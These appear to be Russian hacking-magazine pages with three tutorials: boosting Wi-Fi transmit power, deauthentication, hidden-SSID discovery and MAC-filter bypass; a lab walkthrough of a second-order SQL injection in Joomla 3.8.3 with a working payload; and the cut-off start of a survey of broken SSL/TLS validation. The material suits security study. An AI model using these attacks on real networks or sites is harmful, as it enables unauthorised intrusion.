                        чувствительностью позволит захватить качествен‐
                     ные хендшейки, содержащие всю необходимую
                    информацию для восстановления пароля подклю‐
                         чения.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

      ОДНА «АЛЬФА»
   ХОРОШО, А ДВЕ —
            ЛУЧШЕ!
           ГОТОВИМСЯ К ПРОДВИНУТЫМ ТЕХНИКАМ
                               ВЗЛОМА WI‐FI





Мощность передатчика
Сидеть в засаде с чувствитель ным при емником совершенно безопасно,
однако прождать сбор хендшейков можно не один час. Продвинутые атаки
на беспроводные сети занимают минуты и строятся на том, что ты действу ешь
активно. Например, рассыла ешь пакеты деавториза ции, вынуждая легальные
клиенты атакуемой точки доступа выполнять пос тоянный реконнект. Либо ты
просто глушишь реальную AP, подменяя ее в эфире своим «злым клоном»,
и напрямую получаешь пароли от доверчивых клиентских устройств. Все
это требует мощного передатчика, но где его взять?
   Есть два варианта: сразу обзавес тись мощным либо прибавить мощности
имеющемуся. В первом случае могут быть проблемы с покупкой, особенно
из‐за рубежа. Устрой ства с мощностью выше 100 мВт часто задерживают
на таможне. Плюс любая покупка требует затрат, поэтому рассмотрим второй
вариант.


           WARNING

                      Работая на высокой мощности, адаптер быстро
                       перегревается  (особенно  в  режиме  инжекта
                          пакетов), вызывает помехи связи и представляет
                        некото рую  опасность  для  здоровья.  Поэтому
                      не  ставь  сразу  33  dBm.  Поп робуй  начать
                        с 22 и плавно увеличивать значение. Шкала здесь
                      логарифмическая,      поэто му      прибавка
                       на пару‐тройку dBm дает двук ратное повышение
                  мощности.


По умолчанию все Wi‐Fi‐модули стартуют на минимальной мощ ности. В таком
режиме они запускаются согласно стандарту ISO 3166, который отражен
в базе данных беспроводных устройств. В Linux это wireless regulatory data‐
base. В Kali Linux (вклю чая Nethunter) она находится по адре су /lib/crda/
regulatory.bin. Этот файл считыва ет агент центральной базы данных рег‐
ламентированных настро ек  (Central  Regulatory Domain  Agent — CRDA)
и  отправляет  ядру  информа цию  о  том,  какая мощ ность  допустима
для передатчика в данном регионе. Таким образом, в ОС действует общая
системная настрой ка мощности передат чика для любых Wi‐Fi‐адаптеров
на конкретном беспроводном интерфейсе.
  По умолчанию обычно задан какой‐нибудь код из региона EMEA, где раз‐
решаются только жалкие 100 мВт (20 дБм). Поэто му, подключив любой донгл,
ты будешь тщет но слать пакеты deauth и пытать ся заглушить найденные AP.
Мало кто услышит твои 20 дБм, а льви ная доля команд отфильтруется
целевыми устройствами как помехи.


Посмотреть текущий регион, доступные каналы и разрешенные пределы
мощности можно командой iw list, однако ее выдача получается очень
длинной (на несколько экра нов).





            Смотрим параметры беспроводных устрой ств

Быстро проверить MAC‐адрес и заданную мощность передатчика удобнее
командой iw <имя_интерфейса> info.





                    Экспресс‐про верка нас троек



Во времена BackTrack можно было просто взять адаптер посерьезнее (нап‐
ример, от Alfa Network) и сразу получить прибавку мощности. Дело в том, что
в них изначально был прошит такой региональный код, который позволяет
использовать большую мощность. Например, код «BO» — Боливия. Когда‐то
там была разрешена мощ ность передат чиков IEEE 802.11b/g/n до 2000 мВт
(33 дБм). Это в двадцать раз больше значения по умол чанию в России. Сей‐
час в Боливии действует огра ничение в 30 дБм (1000 мВт), но это все равно
на порядок лучше дефолтных настроек.
  Сегодня региональные настройки ужесточились, а одна и та же модель
обзавелась парой‐тройкой ревизий. Поэтому каж дая покупка «Альфы» прев‐
ратилась в лотерею. Мож но нарвать ся на удешевленную ревизию или просто
грубую подделку. Напрашивается вывод: надо вручную сменить реги он, под‐
клю чить «Альфу» или другой проверенный адаптер, задать более высокую
мощность передатчика и нас лаждать ся жизнью. Действительно, в большинс‐
тве дистрибутивов для пен теста это дела ется просто. Я специально проверил
пять разных: Kali, BugTraq II, Backbox, Cyborg и Matriux. Везде команда смены
региона и увеличения мощ ности сработа ла букваль но в пять строк.
   Какие‐то особен ности были только в Backbox. Название беспроводного
интерфейса в нем выглядит как wlxmac, где вместо mac — адрес адаптера,
записанный в нижнем регистре. Утилита macchanger отрабаты вает коррек‐
тно, однако название интерфейса оста ется преж ним. Это надо учесть в пос‐
ледней команде его активации (см. далее по тексту).





                     Хитрое наз вание wlan в Backbox

Общий принцип софтового увеличения мощности передатчика простой,
но тут важны детали. Поэто му раз берем его пошагово на примере Kali 2018.1.


             INFO

                      Прак тически все команды выполняются от имени
                       суперпользователя. Запусти терминал под рутом
                      или дописывай sudo в начале каждой строки.


Сначала мы определяем имена беспроводных интерфейсов командой iw‐
config. Видим, к примеру, wlan0 и wlan1 — как понять, какой из них нужный?
Кроме многократно описанных крас ноглазых способов, есть и другие — быс‐
трые и гарантированные.
  Первый спо соб: физичес ки отклю чаем USB‐донгл и пишем команду iw‐
config заново. Тот интерфейс, которого теперь нет в списке, и был нужным.





             Определяем беспроводные интерфейсы

Вто рой спо соб: вызываем wifite. Он хоть и считается примитивным
скриптом, зато сразу спра шивает, какой интерфейс использовать, и обоз‐
начает их уже более внятно — с ука зани ем чипсета и задействованных драй‐
веров. Если в названии wlan есть извес тный чипсет и окончание USB — он
и нужен.





                   Смот рим номер wlan в wiﬁte

После того как определились с названием беспроводного интерфейса,
отключаем его.


ifconfig wlan1 down

На этом этапе желательно сменить MAC‐адрес адаптера.


 macchanger ‐r wlan1

Ключ ‐r задает случайный адрес, а если хочешь указать определенный,
используй ключ ‐‐mac . Нап ример:


macchanger ‐‐mac=2F:4B:D9:33:89:0B wlan1

Напоминаю, что первые три цифры указыва ют про изводителя. Их список (OUI
vendor list) смотри здесь или здесь. Он пригодится, если ты хочешь сымити‐
ровать подклю чение от устройства другого вен дора или не слишком выдавать
атаку полностью случайным MAC‐адресом. К тому же многие AP сегодня све‐
ряются с OUI и просто отказывают в подключении клиентам с MAC‐адре сом
неизвестного про изводителя.
   Теперь задаем название региона, в котором разрешены передатчики
мощностью 30 дБм или выше.


iw reg set BO

Помимо BO, для повышения мощ ности также успешно используются регионы
AM, BZ, GR, GY, NZ, VE и дру гие (полный спи сок смотри в файле db.txt,
ссылка на него есть во врезке далее по тексту). Опционально проверяем
новую установку региона:


iw reg get

Далее меняем системную нас тройку допустимой мощности для выбранного
беспроводного интерфейса:


iwconfig wlan1 txpower 30

Поднимаем его:


ifconfig wlan1 up

и проверяем результат:


iwconfig

Должно получиться примерно так, как на скрин шоте ниже.





Если не удалось, то вни мательно проверь команды еще раз. Также учти, что
общую настройку iw reg set может игнориро вать драйвер. На моей прак‐
тике такое встречалось с драйвером ath9k htc и чипом Qualcomm Atheros
AR9271. На нем, в частнос ти, производится модель AWUS036NHA. Поэкспе‐
риментируй с другими драйверами, адап терами и дис трибутивами Linux.


             INFO

                     Настройки  wireless regdb прописаны в файле
                            db.txt внутри архива. В нем ты увидишь регионы
                      и с большей разрешенной мощностью, но не спе‐
                  ши радоваться. Даже если выставить 36 дБм, то
                       совсем не факт, что твой донгл от этого станет
                       дальнобойнее.   Большинство   USB‐адаптеров
                      не дотягивают и до 30 дБм из‐за чисто конструк‐
                       тивных  ограничений.  Дальнейшее  устра нение
                    софтовых лимитов им не поможет.


После увеличения мощ ности можно гораз до эффективнее выполнять атаки
на AP с использованием деаутентифика ции подклю ченных к ним клиентов.
В примере ниже до целевой точки доступа примерно 20 метров и две кир‐
пичные стены. Без увеличения мощности передатчика ее клиенты просто
не слышат команды deauth. Если поднять мощ ность донгла с 20 до 30 дБм, то
принудительное отключение ее клиентов и захват хендшейка занимает менее
восьми минут.





                     Ус пешный захват хендшейка

Если пароль словарный, то он быстро вскроется на том же ноутбуке. Иначе
попробуй сбрутить его на видюхах (см. статью «Брут на GPU») или в
каком‐нибудь онлайновом сервисе.





                     Подбор пароля в EDPR





              Проверка хендшейка и его брут в облаке

Также тебе может пригодиться онлайновый конвертер .cap → hashcat и ана‐
лизатор файлов .pcap. Преобразовать .cap в .pcap можно с помощью tshark:


tshark ‐F libpcap ‐w <имя_файла_pcap> ‐r <имя_файла_cap>

Ранее мы писали о взломе Wi‐Fi со смартфона, но выпол нять продвинутые
атаки с него очень неудобно (а некоторые — техничес ки невозможно). Нужно
каким‐то образом подключать сра зу два внеш них адаптера и (желательно)
внешний аккумулятор, а потом долго мучиться с повышением мощности их
передатчиков. В пять строк это уже не сделаешь — там семь кругов ада
с make/install и отловом ошибок. Если тебе хочется хайтек‐мазохизма, я
как‐нибудь поделюсь с тобой этой болью, а сейчас лучше возьми ноутбук
и запусти десктопную Kali.


УЗНАЁМ ИМЕНА СКРЫТЫХ СЕТЕЙ
Имя беспроводной сети (SSID или ESSID) иногда специально скрывают
для ее защиты. Действительно, так отсекаются неофи ты и поток желающих
подклю читься к AP замет но умень шается: если цель не видно, многие ее
не атакуют. Однако узнать SSID довольно просто: эта информация постоянно
транслируется в эфир.
  Каждый клиент указывает в «рукопожатии» имя сети (SSID), ее цифровой
идентификатор (BSSID, обычно совпада ет с MAC AP) и свой MAC‐адрес.
Поэтому атака деавторизации успешно исполь зуется для выяснения SSID
скрытых сетей. Если удас тся перехватить хендшейк при подключении легаль‐
ного клиента к выбранной точке доступа, то мы сразу узнаем ее имя. Дос‐
таточно написать простейшую команду и подождать.


airodump‐ng wlan1

Подразумевается, что твой донгл определяется как wlan1, его мощность уже
увеличена, а сам он переключен в режим монитора. Если еще нет, то просто
выруби его (ifconfig wlan1 down), и airodump‐ng сам переве дет его в moni‐
tor mode.
   Ждать хендшейка неопределенно долго, поэтому давай ускорим процесс.
Откроем второе окно терминала и отправим в нем широковещательную
команду деавторизации, зас тавив всех клиентов выб ранной AP заново под‐
клю читься и прокричать ее SSID на весь эфир.


aireplay‐ng ‐0 5 ‐a D8:FE:E3:XX:XX:XX wlan1

Этой командой мы отправили пять пакетов deauth всем клиентам точки дос‐
тупа с MAC‐адресом D8:FE:E3:и так далее (часть адреса, как обычно, скры‐
ваю, наслаждаясь паранойей). Результат не заставил себя ждать. Буквально
сразу в основном окне airodump‐ng появи лось имя сети. Пока оно было скры‐
то, вместо имени отоб ражалась его длина (в данном примере — шесть сим‐
волов).





                 Быстро узнаем SSID скрытой сети


ОБХОДИМ ФИЛЬТРАЦИЮ ПО MAC-АДРЕСУ
Дополнительно админы соз дают белые списки беспроводных устройств, раз‐
решая подключаться только девайсам c определенными MAC‐адресами.
В режиме фильтрации по MAC точка доступа откажет в авторизации пос‐
торонним устройствам, даже если от них получен верный пароль.
  Однако нам важно дру гое: если клиентское устройство соединилось
с выбранной точкой дос тупа, зна чит, оно гарантированно есть в ее «белом
списке». Осталось кикнуть его прочь с целевой AP и присвоить его (откры то
передаваемый в эфир) MAC‐адрес сво ему адаптеру Wi‐Fi. Чтобы успеть под‐
клю читься вместо доверенного девайса, команду деавторизации лучше
запустить параллельно в дру гом окне тер минала и отправлять их со второго
донгла. Вот как это выглядит поэтап но на AP из при мера выше.
 1. Поднимаем мощ ность адаптера, маскируем его MAC‐адрес и переводим
   в режим монитора (см. первую часть статьи).
 2. Слушаем эфир:


   airodump‐ng wlan1

  В таблице будут отображаться точки доступа и MAC‐адреса подключенных
   к ним клиентов (см. стол бец «STATION» напротив нужной AP).





                       Уз наем MAC‐адреса клиентов
 3. Присваиваем одному из сво их донглов этот MAC‐адрес.


   macchanger ‐‐mac=64:DB:43:XX:XX:XX wlan1

 4. Со второго адаптера шлем пакеты деавториза ции.


   aireplay‐ng ‐0 5 ‐a D8:FE:E3:XX:XX:XX wlan1

 5. Подклю чаемся первым адаптером, как только настоящий клиент отру бится
   от AP.


ВЫВОДЫ
Для выполнения качественного пентеста бес проводных точек доступа необ‐
ходимо приобрести пару USB‐адаптеров  Wi‐Fi с подходящими чипами
и доработать их. Подключить вмес то штатных антенн направленные внешние
и повысить мощность передатчика, увеличив значение txpower.
  Скрытое имя беспроводной сети и фильтрация клиентов по MAC‐адресам
слабо препятствуют ее взло му. SSID и подходящие адреса из «белого спис‐
ка» легко узнать, прос то дождавшись очередного хендшейка или сразу
выпол нив атаку деавториза ции.
ВЗЛОМ
КАВЫЧКОЙ
    ПО «ДЖУМЛЕ»




                    УЧИМСЯ ПРОВОДИТЬ
                        SQL‐ИНЪЕКЦИЮ
                      ВТОРОГО ПОРЯДКА
                            НА ПРИМЕРЕ
                  УЯЗВИМОСТИ В JOOMLA





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





Joomla — вторая по популярности система управления сай‐
тами после WordPress. Уязвимость, о которой мы поговорим
в этой статье, позволяет атакующему без особых проблем
одним запросом поднять свои привиле гии в CMS до супер‐
пользователя, от которого до выполнения кода один шаг.


Проблема затрагивает все существу ющие версии Joomla вплоть до 3.8.3.
О деталях сообщил исследова тель из компании RIPS Technologies. Уяз‐
вимость получила идентификатор CVE‐2018‐6376. В версии 3.8.4 она была
исправлена разработчиками CMS, о чем сооб щается в анон се от 30 января.
  Проэксплуатировать уязвимость можно, обла дая привилегиями менед‐
жера в системе или выше. Сам баг довольно интерес ный, и его изучение поз‐
волит нам поговорить о технике инъ екций second order SQL.


СТЕНД
Для тестирования экспло ита первым делом готовим стенд. Разумеется,
у Joomla есть официальный репозиторий на сайте Docker Hub, где ты можешь
найти всевозможные версии CMS. Но использовать их я не буду и под готов‐
лю свой контейнер, поскольку делается это всего несколькими командами.
  Сначала запускаем контейнер с Debian 9.


docker run ‐ti ‐p80:80 ‐‐rm ‐‐name=joomlavh ‐‐hostname=joomlavh
debian /bin/bash

Ставим все необходимое: MySQL, Apache 2 и PHP 7.0.


apt‐get update && apt‐get install ‐y mysql‐server apache2 php php7.
0‐xml php7.0‐mysqli nano wget

Теперь сама CMS. Нам нужна версия 3.8.3.


cd /var/www/html/
wget https://downloads.joomla.org/cms/joomla3/3‐8‐3/
Joomla_3‐8‐3‐Stable‐Full_Package.tar.gz?format=gz
tar xzf Joomla*
chown ‐R www‐data:www‐data .

И последнее: стартуем нужные сервисы и создаем базу данных для будущей
установки приложения.


service mysql start && service apache2 start
mysql ‐u root ‐e "CREATE DATABASE joomla; GRANT ALL PRIVILEGES ON *.
* TO 'root'@'localhost' IDENTIFIED BY 'megapass';"

После этого необ ходимо перейти на свежеподнятый веб‐сервер и установить
CMS.





                       Ус тановка Joomla 3.8.3

Создай аккаунт с правами Manager, через него будем тес тировать экс плоит.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  КАВЫЧКОЙ ПО «ДЖУМЛЕ»
              УЧИМСЯ ПРОВОДИТЬ SQL‐ИНЪЕКЦИЮ
                  ВТОРОГО ПОРЯДКА НА ПРИМЕРЕ
                       УЯЗВИМОСТИ В JOOMLA





ПОДРОБНЕЕ ОБ УЯЗВИМОСТИ
Из анонса уязвимости можно узнать, что корень проблемы — в отсутствии
приведения типов перемен ной в информационных сообщениях темплейта
Hathor (Hathor postinstall message).





                Анонс уязвимости в Developer Network

Hathor — это название одно го из предус тановленных бэкенд‐шаблонов
административной панели, с которым поставляется Joomla.





        Настройка шаблонов панели администри рования в Joomla

По умолчанию используется темплейт isis (на вся кий случай: он назван в честь
богини Исиды, а не запрещенной в РФ орга низа ции), но пользователю раз‐
решено вручную менять его в настройках про филя. Находится эта страничка
по адресу


/administrator/index.php?option=com_admin&view=profile&layout=edit





              Настрой ка профиля текущего пользователя

Теперь настало время зарыться в дебри исходни ков. Но где искать? Отправ‐
ную точку, как обыч но, ищем в коммите, который реша ет проблему.





                   Коммит с пат чем для SQLi

Как видишь, нам необ ходимо заглянуть в файл hathormessage.php.


/administrator/templates/hathor/postinstall/hathormessage.php
19: function hathormessage_postinstall_condition()
20: {
...
22:     $user           = JFactory::getUser();
...
39:     // Get the current user admin style
40:     $adminstyle = $user‐>getParam('admin_style', '');
41:
42:     if ($adminstyle != '')
43:     {
44:         $query = $db‐>getQuery(true)
45:             ‐>select('template')
46:             ‐>from($db‐>quoteName('#__template_styles'))
47:             ‐>where($db‐>quoteName('id') . ' = ' . $adminstyle[0]
)
48:             ‐>where($db‐>quoteName('client_id') . ' = 1');
...
50:         // Get the template name associated to the admin style
51:         $template = $db‐>setquery($query)‐>loadResult();

После патча переменная $adminstyle при водится к int, значит, она нам
и нужна. Строка 40 говорит нам о том, что значение переменной —
это результат работы метода getParam из клас са User.


/libraries/src/User/User.php
024: class User extends \JObject
025: {
...
318:    public function getParam($key, $default = null)
319:    {
320:        return $this‐>_params‐>get($key, $default);
321:    }

Параметры ($this‐>_params) текущего пользователя — это экземпляр клас‐
са Registry.


/libraries/src/User/User.php
233:    public function __construct($identifier = 0, UserWrapper $
userHelper = null)
234:    {
...
242:        // Create the user parameters object
243:        $this‐>_params = new Registry;

При инициализации пользователя, сохранении данных профиля и прочих
манипуляциях с пользовательскими нас тройками данные попадают в эту
переменную. В том числе и нужный нам admin_styles. Нам остается лишь
задать ему значение. Выше я уже писал, где находится редактирование про‐
филя текуще го юзера.
  Давай включим сниффер и сохраним данные профиля. В пойманном
пакете будет атрибут с названием jform[params][admin_style]. Так как в
запрос попадает первый элемент мас сива, то добавляем каноничную кавыч‐
ку.





  Добавление кавычки в атрибут admin_style из запроса на изменение про‐
  филя пользователя

Теперь переходим на главную страницу контрольной панели и наблюдаем
ошибку SQL‐синтаксиса.





            Ошибка SQL в панели управления Joomla

Поставим что‐нибудь поос мысленнее:


0 and updatexml(0x3a, concat(1, (select user())), 1)#




                Успешная SQL‐инъекция в Joomla 3.8.3

Вот и SQL‐инъекция типа second order!
  Небезопасные данные профиля записа лись в базу данных в виде атри бута
admin_styles нашего пользователя, а затем эти данные в сыром виде
попадают в запрос выборки из таб лицы. Подробнее о таких уязвимостях
можешь почитать, например, на сайте раз работчиков Burp Suite.





               Небезопас ные данные в базе данных

Теперь разберемся, как появляют ся эти сообщения. Заглянем в индексный
файл текуще го темплейта. В коде вызывается обра ботчик message.


/administrator/templates/isis/index.php
300:                <div class="span12">
...
302:                    <jdoc:include type="message" />

Он как раз используется для вывода предупреждений, сообщений об ошиб‐
ках и отчетов об успешно выполненных действиях.





  Дерево DOM‐объектов, которые отвечают за сообщения в панели
  управления


/administrator/templates/isis/html/layouts/joomla/system/mes-
sage.php
12: $msgList = $displayData['msgList'];
...
17:     <?php if (is_array($msgList) && $msgList) : ?>
18:         <?php foreach ($msgList as $type => $msgs) : ?>
19:             <div class="alert <?php echo isset($alert[$type]) ? $
alert[$type] : 'alert‐' . $type; ?>">
...
20:                 <button type="button" class="close"
data‐dismiss="alert">&times;</button>
21:                 <?php if (!empty($msgs)) : ?>
22:                     <h4 class="alert‐heading"><?php echo JText::
_($type); ?></h4>
23:                     <?php foreach ($msgs as $msg) : ?>
24:                         <div class="alert‐message"><?php echo
$msg; ?></div>
25:                     <?php endforeach; ?>
26:                 <?php endif; ?>

Данные сообщений берут ся из элемента msgList мас сива $displayData. Этот
массив заполняется при вызове метода render класса MessageRenderer,
который, как следует из названия, отвечает за формирование HTML‐кода
для последующего вывода пользователю.


/libraries/src/Document/Renderer/Html/MessageRenderer.php
22: class MessageRenderer extends DocumentRenderer
23: {
...
35:     public function render($name, $params = array(), $content =
null)
36:     {
37:         $msgList     = $this‐>getData();
38:         $displayData = array(
39:             'msgList' => $msgList,
40:             'name'    => $name,
41:             'params'  => $params,
42:             'content' => $content,
43:         );
...
60:         return LayoutHelper::render('joomla.system.message', $
displayData);

Данные системных сооб щений возвращает метод getData.


/libraries/src/Document/Renderer/Html/MessageRenderer.php
70:     private function getData()
71:     {
72:         // Initialise variables.
73:         $lists = array();
74:
75:         // Get the message queue
76:         $messages = \JFactory::getApplication()‐>getMessageQueue
();
77:
78:         // Build the sorted message list
79:         if (is_array($messages) && !empty($messages))
80:         {
81:             foreach ($messages as $msg)
82:             {
83:                 if (isset($msg['type']) && isset($msg['message'])
)
84:                 {
85:                     $lists[$msg['type']][] = $msg['message'];
86:                 }
87:             }
88:         }
89:
90:         return $lists;
91:     }

Сообщения  берутся  из  очереди,  которую CMS  пытается  запросить
с помощью метода getMessageQueue.


/libraries/src/Application/CMSApplication.php
465:    public function getMessageQueue($clear = false)
466:    {
467:        // For empty queue, if messages exists in the session,
enqueue them.
468:        if (!$this‐>_messageQueue)
469:        {
470:            $session = \JFactory::getSession();
471:            $sessionQueue = $session‐>get('application.queue',
array());
472:
473:            if ($sessionQueue)
474:            {
475:                $this‐>_messageQueue = $sessionQueue;
476:                $session‐>set('application.queue', array());
477:            }
478:        }
479:
480:        $messageQueue = $this‐>_messageQueue;
481:
482:        if ($clear)
483:        {
484:            $this‐>_messageQueue = array();
485:        }
486:
487:        return $messageQueue;
488:    }

Добавление в оче редь производится из разных учас тков кода на этапе
выпол нения. Сейчас нас интересу ет модуль com_cpanel. Он, собс твенно,
и отвечает за работу с административной панелью и вызывается при выпол‐
нении метода display из базово го кон троллера CMS.


/libraries/src/MVC/Controller/BaseController.php
614:    public function display($cachable = false, $urlparams = array
())
615:    {
...
621:        $view = $this‐>getView($viewName, $viewType, '', array('
base_path' => $this‐>basePath, 'layout' => $viewLayout));
...
672:            $view‐>display();

Этот метод пробегает по всем компонентам, которые используются в данный
момент, и выполняет метод display уже в их кон тексте.


/administrator/components/com_cpanel/views/cpanel/view.html.php
17: class CpanelViewCpanel extends JViewLegacy
18: {
...
33:     public function display($tpl = null)
34:     {

Внутри компонента com_cpanel идет выбор ка сооб щений, поступающих пос‐
ле установ ки.


/administrator/components/com_cpanel/views/cpanel/view.html.php
50:         try
51:         {
52:             $messages_model = FOFModel::getTmpInstance('Messages'
, 'PostinstallModel')‐>eid(700);
53:             $messages       = $messages_model‐>getItemList();
54:         }
55:         catch (RuntimeException $e)
56:         {
57:             $messages = array();
58:
59:             // Still render the error message from the Exception
object
60:             JFactory::getApplication()‐>enqueueMessage($e‐>getMes
sage(), 'error');
61:         }
62:
63:         $this‐>postinstall_message_count = count($messages);

Сообщения получаются при помощи надс тройки FOF (FrameworkOnFrame‐
work). Сначала она получает экземпляр клас са PostinstallModelMessages
из модуля com_postinstall, а затем, при помощи метода getItemList,
выпол няется вызов метода buildQuery уже непос редственно в контексте
модели PostinstallModelMessages. Этот метод формирует SQL‐запрос
для выборки сообщений из таб лицы.


/libraries/fof/model/model.php
1215:   public function &getItemList($overrideLimits = false, $group
= '')
1216:   {
1217:       if (empty($this‐>list))
1218:       {
1219:           $query = $this‐>buildQuery($overrideLimits);


/administrator/components/com_postinstall/models/messages.php
17: class PostinstallModelMessages extends FOFModel
18: {
...
28:     public function buildQuery($overrideLimits = false)
29:     {
30:         $query = parent::buildQuery($overrideLimits);
31:
32:         $db = $this‐>getDbo();
33:
34:         // Add a forced extension filtering to the list
35:         $eid = $this‐>getState('eid', 700);
36:         $query‐>where($db‐>qn('extension_id') . ' = ' . $db‐>q($
eid));
37:
38:         // Force filter only enabled messages
39:         $published = $this‐>getState('published', 1, 'int');
40:         $query‐>where($db‐>qn('enabled') . ' = ' . $db‐>q($publis
hed));
41:
42:         return $query;
43:     }

Затем полученный запрос выполняется и дела ется выборка из таблицы
postinstall_messages. Сам запрос выглядит так:


SELECT `#__postinstall_messages`.*
FROM `#__postinstall_messages`
WHERE `extension_id` = '700' AND `enabled` = '1'

После получения результатов выборки выполняется метод _getList.


/libraries/fof/model/model.php
1225:               $this‐>list = $this‐>_getList((string) $query, $
limitstart, $limit, $group);
1226:           }
1227:           else
1228:           {
1229:               $this‐>list = $this‐>_getList((string) $query, 0,
 0, $group);
1230:           }
1231:       }
1232:
1233:       return $this‐>list;

Внутри него происходит вызов onProcessList.


/libraries/fof/model/model.php
1950:   protected function &_getList($query, $limitstart = 0, $limit
= 0, $group = '')
1951:   {
1952:       $this‐>_db‐>setQuery($query, $limitstart, $limit);
1953:       $result = $this‐>_db‐>loadObjectList($group);
1954:
1955:       $this‐>onProcessList($result);
1956:
1957:       return $result;
1958:   }

Метод onProcessList пробегается по всем найденным в базе элементам
и выполняет из файла, ука занного в поле condition_file, функцию, которая
находится в поле condition_method.





  Запись из таблицы postinstall_messages. Выделенные поля указывают
  на файл и функцию, которая будет выполнена


/administrator/components/com_postinstall/models/messages.php
124:    protected function onProcessList(&$resultArray)
125:    {
...
132:        foreach ($resultArray as $key => $item)
133:        {
134:            // Filter out messages based on dynamically loaded
programmatic conditions.
135:            if (!empty($item‐>condition_file) && !empty($item‐>
condition_method))
136:            {
137:                jimport('joomla.filesystem.file');
138:
139:                $file = FOFTemplateUtils::parsePath($item‐>condit
ion_file, true);
140:
141:                if (JFile::exists($file))
142:                {
143:                    require_once $file;
144:
145:                    $result = call_user_func($item‐>condit
ion_method);

Вот мы и вернулись к тому, с чего начали, — вызову уяз вимой функции
hathormessage_postinstall_condition.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
В популярных CMS подоб ные дыры находят с завидной периодичностью. Эта,
например, была обнаружена с помощью ста тического анализа кода. Раз‐
работчикам в обязательном порядке нужно вклю чать такие штуки в свой пай‐
плайн, но при этом не забывать, что это не панацея.
  Сама уязвимость может быть использована для повышения привиле гий
в системе и, например, для извлечения сес сии суперпользователя. Так что
если у тебя где‐то установлена Joomla, то не медли и обновляйся.
ВЗЛОМ
 ГРАНДИОЗНЫЙ
  ФАКАП





   РАЗБИРАЕМ УЯЗВИМОСТИ ПРОВЕРКИ
       СЕРТИФИКАТОВ SSL И TLS
       В НЕБРАУЗЕРНОМ СОФТЕ




Первоначально разработанный для браузе‐
ров, SSL/TLS‐протокол позже стал стан‐
дартом  де‐факто  вообще   для   всех
защищенных интернет‐коммуникаций. Сей‐
час он используется для уда лен ного адми‐           Антон Карев                                                                                    Эксперт по информационной
нистрирования  виртуальной инфра струк‐       безопасности.высшее, специальностьОбразование
туры, развернутой в обла ке, для передачи      компьютерных«Защита информациисистемах»,в в
платежных реквизитов покупа теля от сер‐      настоящийнад диссертацией.момент работаетОбласть
                                                                                     профессиональных
веров электронной коммерции к платежным      интересов — технологическая
                                                                                          разведка, аналитика в сфере
                                                                                      ИБ, искусственныйпроцессорам, таким как PayPal и Amazon,
                                                                                                     интеллект.
                                                                                              vedacoder@mail.ruдля   пересылки    локальных   данных
в   облачное   хра нилище,   сох ранения
переписки в мессен джерах и аутентифика‐
ции серверов в мобильных приложениях
iOS и Android. Как видишь, список ситуаций,
когда  обмен   весьма   чувствительной
информацией   требует   максимальной
безопасности,   довольно   внушителен.
В этой статье мы рассмотрим, как безопас‐
ность этих ком муникаций обеспечива ется
на практике.


ХОТЕЛИ КАК ЛУЧШЕ
В теории, защищенное SSL/TLS‐протоколом соединение дол жно обес‐
печивать конфиденциальность, достоверность и целостность коммуникаций
клиентского и серверно го софта, даже если в сеть проник активный прод‐
винутый злоумышленник: ког да сеть полностью захвачена врагом, DNS
отравлен, а точ ки доступа и маршру тиза торы, коммутаторы и Wi‐Fi контро‐
лируются злоумышленником, который, помимо всего прочего, контролирует
SSL/TLS‐бэкенд. Кроме того, когда кли ентский софт пытается подключиться
к законному серверу, зло умышленник может подменить сетевой адрес сер‐
вера (например, через отравление DNS) и перенаправить клиент вмес то
законного сервера на свой злонамеренный сервер.
   Безопасность коммуника ций в таких суровых условиях, как известно,
целиком зависит от адекватнос ти проверки крип тографического сертифика‐
та, предоставленного сервером при установке соединения. В том числе
от адекватности реализации набора шифров (cipher suite), которы ми клиент
и сервер пользуются при обмене данными. Для того чтобы SSL/TLS‐соеди‐
нение было полностью безопас ным, клиентский софт в чис ле прочего дол жен
тщательно удостовериться в том, что:
 • сертификат выдан действу ющим органом сертификации;
 • срок его действия не истек (или сертификат не был отозван);
 • в списке перечисленных в сертификате имен присутству ет тот домен,
    к которому производится подключение.


ПОЛУЧИЛОСЬ КАК ВСЕГДА: ПРОВЕРКА ПРОВАЛЕНА
Однако во многих приложениях и биб лиотеках, для которых безопас ность
коммуникаций очень критична, процеду ра проверки SSL/TLS‐сертификата,
и даже EV‐SSL, сертификата с рас ширенной проверкой, пол ностью проваль‐
на, причем это справедливо для всех популярных операционных систем: Lin‐
ux, Windows, Android и iOS. Среди уяз вимого софта, библиотек и middleware‐
сервисов можно выделить следующие:
 • Amazon’овская Java‐библиотека EC2 и все облачные фронтенд‐клиенты,
   построенные на ее осно ве;
 • Amazon’овский и PayPal’овский торговый SDK, ответственный за доставку
   платежных реквизитов от сайтов (на которых раз вернута инфраструктура
   онлайн‐коммерции) к платеж ным шлюзам;
 • интегрированные «корзины», такие как osCommerce, ZenCart, Ubercart
   и PrestaShop, которые не про веря ют сертифика ты вообще;
 • AdMob‐код, исполь зуемый мобильным софтом для показа контекстной
   рекламы;
 • интерфейсные  фронтенд‐компоненты  ElephantDrive  и  FilesAnywhere,
   ответственные за взаимодействие с облачным хра нилищем;
 • Android’ная библиотека Pusher и весь софт, который использует Pusher API
   для  управления  обменом  мгновенными  сообщениями  (например,
   GitHub’овский Gaug.es);
 • Apache HttpClient (версия 3.x), Apache Libcloud и все клиентские подклю‐
   чения к серверам Apache ActiveMQ и подоб ным;
 • SOAP middleware‐сервисы Java, в том числе Apache Axis, Axis 2, Codehaus
    XFire; а также весь софт, который на базе этих middleware‐сервисов пос‐
   троен;
 • API‐инструменты Elastic Load Balancing;
 • Weberknecht‐реализация WebSockets’ов;
 • а также весь мобильный софт, пос троенный на базе перечисленных выше
   библиотек и middleware‐сервисов (чтобы понять, что такое middleware‐
   сервисы, смотри слайды); в том числе iOS‐клиент хостинг‐провайдера
   Rackspace.





                     Что такое middleware‐сервисы

Например, здесь перечислено еще больше сотни уязвимых мобильных при‐
ложений. В их числе: Android’s Google Cloud Messaging, Angie’s List Business
Center Passwords, AT&T Global Network Client, CapitalOne Spark Pay, Cisco On‐
Plus (remote access), Cisco Technical Support, Cisco WebEx, Cisco WebEx Pass‐
words, Dominos Pizza, E‐Trade, Freelancer, Google Earth, Huntington Mobile
(Bank), Intuit Tax Online Accountant, iTunes Connect, Microsoft Skype, Oracle
